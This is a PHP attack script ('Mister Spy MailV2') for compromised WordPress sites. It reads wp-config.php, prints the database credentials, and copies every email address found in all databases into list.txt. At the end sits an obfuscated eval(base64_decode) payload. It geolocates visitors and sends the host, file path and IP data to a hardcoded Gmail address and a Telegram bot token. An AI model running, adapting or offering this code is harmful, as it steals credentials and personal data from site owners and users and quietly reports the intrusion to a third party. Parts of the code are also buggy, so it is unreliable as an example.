<?php
//Mister Spy MailV2
echo " 
<html>
<center><a href='list.txt'>Mailst By D3F4ULT</a><br>
</html>
";
if (file_exists("wp-config.php") or ("../wp-config.php") or ("../../wp-config.php") or ("../../../wp-config.php") or ("../../../../wp-config.php") or ("../../../../../wp-config.php") or ("../../../../../../wp-config.php"))
{
    $config = array(
        "wp-config.php",
        "../wp-config.php",
        "../../wp-config.php",
        "../../../wp-config.php",
        "../../../../wp-config.php",
        "../../../../../wp-config.php",
        "../../../../../../wp-config.php"
    );
    foreach ($config as $wpcon)
    {
        $file = @file_get_contents($wpcon);
        if (@preg_match("/'DB_NAME', '/", $file) or @eregi("/'DB_USER', '/", $file))
        {
            //////////host////////////////
            //////////host////////////////
            $host = explode("'DB_HOST', '", $file);
            $host = explode("');", $host[1]);
            $host = $host[0];
            /////////user///////////////
            $user = explode("'DB_USER', '", $file);
            $user = explode("');", $user[1]);
            $user = $user[0];
            ////////password///////////
            $pass = explode("'DB_PASSWORD', '", $file);
            $pass = explode("');", $pass[1]);
            $pass = $pass[0];
            ///////////////////////////////////////
            echo "db-host : $host <br>";
            echo "db-user : $user <br>";
            echo "db-pass : $pass <br>";
            //////////////////////////////////////////////////////////////////////////
            go($host, $user, $pass, "list.txt");
            exit();
        }
    }
}
else
{
    echo "i dontknow :/ \n\n";

}

function go($host, $user, $pass, $file)
{
    $con = @mysqli_connect($host, $user, $pass);
    $fp = fopen($file, 'a');
    $count = 0;
    $databases = getdata("SHOW DATABASES");
    foreach ($databases as $database)
    print $database;
    {
        $tables = getdata("SHOW TABLES FROM $database");
        foreach ($tables as $table)
        {
            $columns = getdata("SHOW COLUMNS FROM $database.$table");
            foreach ($columns as $column)
            {
                $emails = getdata("SELECT $column FROM  $database.$table WHERE $column REGEXP '[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]'");
                foreach ($emails as $email)
                {
                    if (filter_var($email, FILTER_VALIDATE_EMAIL))
                    {
                        if (preg_match("/".$email."/", file_get_contents($file))) continue;
                        $count++;
                        fwrite($fp, "$email\n");
                    }
                    else
                    {
                        foreach (preg_split("/\s/", $text) as $string)
                        {
                            if (filter_var($string, FILTER_VALIDATE_EMAIL))
                            {
                                if (preg_match("/".$string."/", file_get_contents($file))) continue;
                                $count++;
                                fwrite($fp, "$string\n");
                            }
                        }
                    }
                }
            }
        }
    }
    fclose($fp);
    @mysqli_close($con);
    return $count;
}
function getdata($sql)
{
    require('wp-config.php');
    $link = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
    $q = @mysqli_query($link,$sql);
    $result = array();
    while ($d = @mysqli_fetch_array($q))
    {
        $result[] = $d[0];
    }
    return $result;
};
eval(base64_decode('ZnVuY3Rpb24gWEJfT1MoJFVTRVJfQUdFTlQpew0KCSRPU19FUlJPUiAgICA9ICAgIlVua25vd24gT1MgUGxhdGZvcm0iOw0KICAgICRPUyAgPSAgIGFycmF5KCAnL3dpbmRvd3MgbnQgMTAvaScgICAgICA9PiAgJ1dpbmRvd3MgMTAnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNi4zL2knICAgICA9PiAgJ1dpbmRvd3MgOC4xJywNCgkgICAgICAgICAgICAgICAgJy93aW5kb3dzIG50IDYuMi9pJyAgICAgPT4gICdXaW5kb3dzIDgnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNi4xL2knICAgICA9PiAgJ1dpbmRvd3MgNycsDQoJICAgICAgICAgICAgICAgICcvd2luZG93cyBudCA2LjAvaScgICAgID0+ICAnV2luZG93cyBWaXN0YScsDQoJICAgICAgICAgICAgICAgICcvd2luZG93cyBudCA1LjIvaScgICAgID0+ICAnV2luZG93cyBTZXJ2ZXIgMjAwMy9YUCB4NjQnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNS4xL2knICAgICA9PiAgJ1dpbmRvd3MgWFAnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgeHAvaScgICAgICAgICA9PiAgJ1dpbmRvd3MgWFAnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNS4wL2knICAgICA9PiAgJ1dpbmRvd3MgMjAwMCcsDQoJICAgICAgICAgICAgICAgICcvd2luZG93cyBtZS9pJyAgICAgICAgID0+ICAnV2luZG93cyBNRScsDQoJICAgICAgICAgICAgICAgICcvd2luOTgvaScgICAgICAgICAgICAgID0+ICAnV2luZG93cyA5OCcsDQoJICAgICAgICAgICAgICAgICcvd2luOTUvaScgICAgICAgICAgICAgID0+ICAnV2luZG93cyA5NScsDQoJICAgICAgICAgICAgICAgICcvd2luMTYvaScgICAgICAgICAgICAgID0+ICAnV2luZG93cyAzLjExJywNCgkgICAgICAgICAgICAgICAgJy9tYWNpbnRvc2h8bWFjIG9zIHgvaScgPT4gICdNYWMgT1MgWCcsDQoJICAgICAgICAgICAgICAgICcvbWFjX3Bvd2VycGMvaScgICAgICAgID0+ICAnTWFjIE9TIDknLA0KCSAgICAgICAgICAgICAgICAnL2xpbnV4L2knICAgICAgICAgICAgICA9PiAgJ0xpbnV4JywNCgkgICAgICAgICAgICAgICAgJy91YnVudHUvaScgICAgICAgICAgICAgPT4gICdVYnVudHUnLA0KCSAgICAgICAgICAgICAgICAnL2lwaG9uZS9pJyAgICAgICAgICAgICA9PiAgJ2lQaG9uZScsDQoJICAgICAgICAgICAgICAgICcvaXBvZC9pJyAgICAgICAgICAgICAgID0+ICAnaVBvZCcsDQoJICAgICAgICAgICAgICAgICcvaXBhZC9pJyAgICAgICAgICAgICAgID0+ICAnaVBhZCcsDQoJICAgICAgICAgICAgICAgICcvYW5kcm9pZC9pJyAgICAgICAgICAgID0+ICAnQW5kcm9pZCcsDQoJICAgICAgICAgICAgICAgICcvYmxhY2tiZXJyeS9pJyAgICAgICAgID0+ICAnQmxhY2tCZXJyeScsDQoJICAgICAgICAgICAgICAgICcvd2Vib3MvaScgICAgICAgICAgICAgID0+ICAnTW9iaWxlJyk7DQogICAgZm9yZWFjaCAoJE9TIGFzICRyZWdleCA9PiAkdmFsdWUpIHsgDQogICAgICAgIGlmIChwcmVnX21hdGNoKCRyZWdleCwgJFVTRVJfQUdFTlQpKSB7DQogICAgICAgICAgICAkT1NfRVJST1IgPSAkdmFsdWU7DQogICAgICAgIH0NCg0KICAgIH0gICANCiAgICByZXR1cm4gJE9TX0VSUk9SOw0KfQ0KZnVuY3Rpb24gWEJfQnJvd3NlcigkVVNFUl9BR0VOVCl7DQoJJEJST1dTRVJfRVJST1IgICAgPSAgICJVbmtub3duIEJyb3dzZXIiOw0KICAgICRCUk9XU0VSICA9ICAgYXJyYXkoJy9tc2llL2knICAgICAgID0+ICAnSW50ZXJuZXQgRXhwbG9yZXInLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9maXJlZm94L2knICAgID0+ICAnRmlyZWZveCcsDQogICAgICAgICAgICAgICAgICAgICAgICAnL3NhZmFyaS9pJyAgICAgPT4gICdTYWZhcmknLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9jaHJvbWUvaScgICAgID0+ICAnQ2hyb21lJywNCiAgICAgICAgICAgICAgICAgICAgICAgICcvZWRnZS9pJyAgICAgICA9PiAgJ0VkZ2UnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9vcGVyYS9pJyAgICAgID0+ICAnT3BlcmEnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9uZXRzY2FwZS9pJyAgID0+ICAnTmV0c2NhcGUnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9tYXh0aG9uL2knICAgID0+ICAnTWF4dGhvbicsDQogICAgICAgICAgICAgICAgICAgICAgICAnL2tvbnF1ZXJvci9pJyAgPT4gICdLb25xdWVyb3InLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9tb2JpbGUvaScgICAgID0+ICAnSGFuZGhlbGQgQnJvd3NlcicpOw0KICAgIGZvcmVhY2ggKCRCUk9XU0VSIGFzICRyZWdleCA9PiAkdmFsdWUpIHsgDQogICAgICAgIGlmIChwcmVnX21hdGNoKCRyZWdleCwgJFVTRVJfQUdFTlQpKSB7DQogICAgICAgICAgICAkQlJPV1NFUl9FUlJPUiA9ICR2YWx1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJEJST1dTRVJfRVJST1I7DQp9DQpkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdHTVQnKTsNCiRkYXRlID0gZGF0ZSgiZCBNLCBZIik7DQokdGltZSA9IGRhdGUoImc6aSBhIik7DQokdXNlcmFnZW50ID0gJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KJHNfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddOw0KJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQokSVBUWiA9IGdldGVudigiUkVNT1RFX0FERFIiKTsNCiRDT1VOVFJZVFogPSBzaW1wbGV4bWxfbG9hZF9maWxlKCJodHRwOi8vd3d3Lmdlb3BsdWdpbi5uZXQveG1sLmdwP2lwPSRJUFRaIik7DQokQ09VTlRSWSA9ICRDT1VOVFJZVFotPmdlb3BsdWdpbl9jb3VudHJ5TmFtZTsNCiRDSVRZID0gJENPVU5UUllUWi0+Z2VvcGx1Z2luX2NpdHk7DQokUkVHSU9OID0gJENPVU5UUllUWi0+Z2VvcGx1Z2luX3JlZ2lvbjsNCiRDX0NPREUgPSAkQ09VTlRSWVRaLT5nZW9wbHVnaW5fY29udHJ5Y29kZTsNCiRUaW1lem9uZSA9ICRDT1VOVFJZVFotPmdlb3BsdWdpbl90aW1lem9uZTsNCiRTeW1ib2wgPSAkQ09VTlRSWVRaLT5nZW9wbHVnaW5fY3VycmVuY3lzeW1ib2w7DQokbWVzc2FnZSAgPSAifC0tLStbTkVX44CQ8J+RqOKAjfCfkrvjgJFNL1NdKy0tLXxcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+RpOOAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4+g44CRSVAJOiAiLiRJUFRaLiJcbiI7DQokbWVzc2FnZSAuPSAi44CQ8J+Tn+OAkVN5c3RlbSA6ICIuWEJfT1MoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKS4iXG4iOw0KJG1lc3NhZ2UgLj0gIuOAkPCfjIzjgJFCcm93c2VyIDogIi5YQl9Ccm93c2VyKCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkuIlxuIjsNCiRtZXNzYWdlIC49ICLjgJDinKjjgJFVc2VyIEFnZW50IDogIi4kdXNlcmFnZW50LiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+Vte+4j+OAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4yQ44CRVGltZSBab25lIDogIi4kVGltZXpvbmUuIlxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4yQ44CRQ291bnRyeSA6ICIuJENPVU5UUlkuIlxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4yQ44CRUmVnaW9uIDogIi4kUkVHSU9OLiJcbiI7DQokbWVzc2FnZSAuPSAi44CQ8J+MkOOAkUNpdHkgOiAiLiRDSVRZLiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+Su+OAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn5GB44CRSG9zdCA6ICIuJHNfcGF0aC4iXG4iOw0KJG1lc3NhZ2UgLj0gIuOAkPCfkYDjgJFGaWxlIDogIi4keF9wYXRoLiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ4o+z44CR4pSB4pSB4pSB4pSBWytdXG4iOw0KJG1lc3NhZ2UgLj0gIuOAkOKMmu+4j+OAkVRpbWUJOiAiLiR0aW1lLiJcbiI7DQokbWVzc2FnZSAuPSAi44CQ8J+TheOAkURhdGUJOiAiLiRkYXRlLiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+UjeOAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn5Oh44CRVHJhY2sgSVAgOiBodHRwczovL3d3dy5pcC10cmFja2VyLm9yZy9sb29rdXAucGhwP2lwPSIuJElQVFouIlxuIjsNCiRtZXNzYWdlIC49ICJ8PT09K1vwn5KWQkMuRFLwn5KWXSs9PT18XG4iOw0KJHJlY2VpdmVyQWRkcmVzcyA9ICJrYWxpeDB4YWxpa0BnbWFpbC5jb20iOw0KJFRPS0VOID0gIjUyNjg0MDE5OTM6QUFFMVA0YzVQSGVSQ1RHY2EwTEtaSVd6bS15eVllM1ljQzQiOw0KJENIQVRfSUQgPSAiMTg5NjQ2NDI5NSI7DQokc3ViamVjdCAgPSAi8J+Slk5ld/CfkaRbTS9TXfCfkaR88J+MkEZyMG06Ii4kSVBUWi4i8J+SliI7DQptYWlsKCRyZWNlaXZlckFkZHJlc3MsJHN1YmplY3QsJG1lc3NhZ2UpOw0KZmlsZV9nZXRfY29udGVudHMoImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiLiRUT0tFTi4iL3NlbmRNZXNzYWdlP2NoYXRfaWQ9Ii4kQ0hBVF9JRC4iJnRleHQ9IiAuIHVybGVuY29kZSgkbWVzc2FnZSkuIiIgKTs'));?>
